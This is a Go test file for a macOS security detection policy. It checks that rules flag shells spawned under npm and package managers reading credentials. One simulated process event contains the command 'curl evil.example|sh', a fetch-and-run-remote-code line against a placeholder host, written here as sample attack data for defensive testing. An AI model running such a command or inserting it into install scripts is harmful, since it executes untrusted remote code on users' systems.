// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2026-present Datadog, Inc.

//go:build unix

package darwin

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/DataDog/datadog-agent/pkg/security/secl/compiler/eval"
)

func TestPolicyLoads(t *testing.T) {
	tr := newTestTranslator(t)

	rs, err := NewRuleSet("policies", func() eval.Event { return tr.newEvent() })
	require.NoError(t, err, "the PoC policy must load against the darwin model")

	ids := map[string]bool{}
	for _, rule := range rs.GetRules() {
		ids[rule.ID] = true
	}
	assert.True(t, ids["macos_pkg_manager_spawns_shell"], "rule 1 must load")
	assert.True(t, ids["macos_pkg_manager_reads_credentials"], "rule 2 must load")
}

// TestShellUnderPackageManagerFires drives the exact tree the demo will show:
// npm -> sh. It is the end-to-end proof that translation plus the rule engine
// produce a match.
func TestShellUnderPackageManagerFires(t *testing.T) {
	tr := newTestTranslator(t)

	rec := &MatchRecorder{}
	rs, err := NewRuleSet("policies", func() eval.Event { return tr.newEvent() })
	require.NoError(t, err)
	rs.AddListener(rec)

	// npm, then a shell forked and exec'd underneath it.
	_, err = tr.Translate(execMessage(t, 700, 1, "/usr/local/bin/npm", []string{"npm", "install"}))
	require.NoError(t, err)
	_, err = tr.Translate(forkMessage(t, 701, 700, "/usr/local/bin/npm"))
	require.NoError(t, err)

	ev, err := tr.Translate(execMessage(t, 701, 700, "/bin/sh", []string{"sh", "-c", "curl evil.example|sh"}))
	require.NoError(t, err)
	require.NotNil(t, ev)

	rs.Evaluate(ev)

	require.Len(t, rec.Matches(), 1, "the shell-under-npm rule must fire exactly once")
	assert.Equal(t, "macos_pkg_manager_spawns_shell", rec.Matches()[0].RuleID)
}

func TestUnrelatedShellDoesNotFire(t *testing.T) {
	tr := newTestTranslator(t)

	rec := &MatchRecorder{}
	rs, err := NewRuleSet("policies", func() eval.Event { return tr.newEvent() })
	require.NoError(t, err)
	rs.AddListener(rec)

	// A shell under a login shell, with no package manager anywhere in the tree.
	_, err = tr.Translate(execMessage(t, 800, 1, "/bin/zsh", []string{"-zsh"}))
	require.NoError(t, err)
	_, err = tr.Translate(forkMessage(t, 801, 800, "/bin/zsh"))
	require.NoError(t, err)

	ev, err := tr.Translate(execMessage(t, 801, 800, "/bin/sh", []string{"sh", "-c", "echo hi"}))
	require.NoError(t, err)
	rs.Evaluate(ev)

	assert.Empty(t, rec.Matches(), "no package manager in the tree means no match")
}

// TestDeepTreeUnderPackageManagerFires checks that the ancestor walk is not
// limited to the immediate parent: a real npm install nests several levels deep
// before reaching a shell.
func TestDeepTreeUnderPackageManagerFires(t *testing.T) {
	tr := newTestTranslator(t)

	rec := &MatchRecorder{}
	rs, err := NewRuleSet("policies", func() eval.Event { return tr.newEvent() })
	require.NoError(t, err)
	rs.AddListener(rec)

	// npm -> node -> node -> sh
	_, err = tr.Translate(execMessage(t, 900, 1, "/usr/local/bin/npm", []string{"npm", "install"}))
	require.NoError(t, err)
	_, err = tr.Translate(forkMessage(t, 901, 900, "/usr/local/bin/npm"))
	require.NoError(t, err)
	_, err = tr.Translate(execMessage(t, 901, 900, "/usr/local/bin/node", []string{"node", "install.js"}))
	require.NoError(t, err)
	_, err = tr.Translate(forkMessage(t, 902, 901, "/usr/local/bin/node"))
	require.NoError(t, err)

	ev, err := tr.Translate(execMessage(t, 902, 901, "/bin/bash", []string{"bash", "-c", "id"}))
	require.NoError(t, err)
	require.NotNil(t, ev)
	rs.Evaluate(ev)

	require.Len(t, rec.Matches(), 1, "a shell several levels below npm must still fire")
	assert.Equal(t, "macos_pkg_manager_spawns_shell", rec.Matches()[0].RuleID)
}

// TestPolicyRejectsUnsupportedField proves NewDarwinModel's gate works: a policy
// field darwin never populates must fail to load rather than load and silently
// never match.
func TestPolicyRejectsUnsupportedField(t *testing.T) {
	tr := newTestTranslator(t)

	dir := t.TempDir()
	writePolicy(t, dir, `
rules:
  - id: uses_a_field_darwin_never_fills
    expression: bpf.cmd == 1
`)

	_, err := NewRuleSet(dir, func() eval.Event { return tr.newEvent() })
	assert.Error(t, err, "a field outside the supported namespaces must be rejected at load time")
}

// TestEmptyPolicyDirIsAnError guards against a silently inert collector.
func TestEmptyPolicyDirIsAnError(t *testing.T) {
	tr := newTestTranslator(t)

	_, err := NewRuleSet(t.TempDir(), func() eval.Event { return tr.newEvent() })
	assert.Error(t, err, "loading no rules at all must be an error, not a quiet no-op")
}

func writePolicy(t *testing.T, dir, content string) {
	t.Helper()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "test.policy"), []byte(content), 0o600))
}
